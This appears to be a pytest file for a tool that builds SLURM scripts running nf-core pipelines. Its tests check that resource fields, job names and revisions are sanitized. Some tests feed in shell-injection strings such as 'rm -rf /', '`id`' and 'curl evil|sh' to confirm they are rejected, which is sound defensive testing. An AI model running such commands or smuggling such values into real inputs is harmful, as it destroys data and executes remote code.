import pytest

from chat_nextseek.luria.run_script import (
    validate_resources,
    sanitize_job_name,
    render_run_script,
)


def test_validate_resources_defaults_when_empty():
    assert validate_resources({}) == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "8G"}


def test_validate_resources_accepts_valid_overrides():
    out = validate_resources({"partition": "high", "time": "12:00:00", "cpus": 8, "mem": "64G"})
    assert out == {"partition": "high", "time": "12:00:00", "cpus": "8", "mem": "64G"}


def test_validate_resources_rejects_bad_values_falls_back():
    out = validate_resources({"partition": "bad; rm -rf /", "time": "lots", "cpus": 999, "mem": "8GB"})
    assert out == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "8G"}


def test_validate_resources_rejects_trailing_newline():
    out = validate_resources({"partition": "bcc\n", "time": "12:00:00\n", "mem": "64G\n"})
    assert out == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "8G"}


def test_validate_resources_non_dict_falls_back():
    assert validate_resources(["not", "a", "dict"]) == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "8G"}


def test_sanitize_job_name_strips_shell_chars():
    assert sanitize_job_name("rnaseq; rm -rf /") == "rnaseq_rm_-rf"
    assert sanitize_job_name("") == "nfcore_run"


def test_render_substitutes_all_slots_and_no_tokens_left():
    script = render_run_script(
        job_name="nfcore_rnaseq", pipeline="nf-core/rnaseq", revision="3.16.1",
        run_dir="/net/x/runs/nfcore_rnaseq_260709",
        work_dir="/net/x/work/nfcore_rnaseq", singularity_cache="/net/x/singularity_cache",
        resources={},
    )
    assert "#SBATCH --job-name=nfcore_rnaseq" in script
    assert "#SBATCH -n 16" in script                      # default cpus
    assert "#SBATCH --mail-user=cdemu@mit.edu" in script
    assert "#SBATCH --output=/net/x/runs/nfcore_rnaseq_260709/nfcore_rnaseq.out" in script
    assert "conda activate cdemu_nfcore" in script
    assert "module add singularity/3.10.4" in script
    assert "cd /net/x/runs/nfcore_rnaseq_260709" in script
    assert "nextflow run nf-core/rnaseq -r 3.16.1 -profile singularity" in script
    assert "--input samplesheet.csv" in script
    assert "--genome GRCh38" in script
    assert "-w /net/x/work/nfcore_rnaseq" in script
    assert "export NXF_SINGULARITY_CACHEDIR=/net/x/singularity_cache" in script
    assert "{{" not in script and "}}" not in script


def test_validate_revision_accepts_normal_revisions():
    from chat_nextseek.luria.run_script import validate_revision
    for r in ("3.21.0", "main", "a1b2c3d", "dev/branch-1"):
        assert validate_revision(r) == r


def test_validate_revision_rejects_shell_metacharacters():
    from chat_nextseek.luria.run_script import validate_revision
    for bad in ("x; rm -rf /", "main | sh", "v1 -c /tmp/e.config", "a\nb", "`id`"):
        with pytest.raises(ValueError):
            validate_revision(bad)


def test_render_run_script_rejects_injected_revision():
    with pytest.raises(ValueError):
        render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="x; curl evil|sh",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", resources={})
